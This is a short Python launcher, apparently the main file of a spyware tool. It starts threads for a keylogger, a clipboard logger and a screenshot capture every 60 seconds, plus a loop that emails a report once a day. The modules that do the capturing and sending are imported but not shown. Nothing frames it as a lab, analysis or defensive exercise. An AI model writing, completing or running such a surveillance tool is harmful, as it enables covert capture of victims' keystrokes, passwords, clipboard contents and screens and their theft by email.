import threading
import time
from keyLogger import startKeyLogger
from clipboard_logger import startClipboard
from screenshot import start_screenshot_capture
from sendEmail import send_daily_report

def run_all():
    # Thread 1: Keylogger
    t1 = threading.Thread(target=startKeyLogger)
    t2 = threading.Thread(target=startClipboard)
    t3 = threading.Thread(target=start_screenshot_capture, args=(60,))  # every 60s

    # Thread 4: Daily email
    def daily_email_loop():
        while True:
            send_daily_report()
            try:
                time.sleep(86400)  # 24 hours in seconds
            except KeyboardInterrupt:
                pass

    t4 = threading.Thread(target=daily_email_loop)

    # Start all
    t1.start()
    t2.start()
    t3.start()
    t4.start()

    # Wait for all
    t1.join()
    t2.join()
    t3.join()
    t4.join()

if __name__ == "__main__":
    run_all()
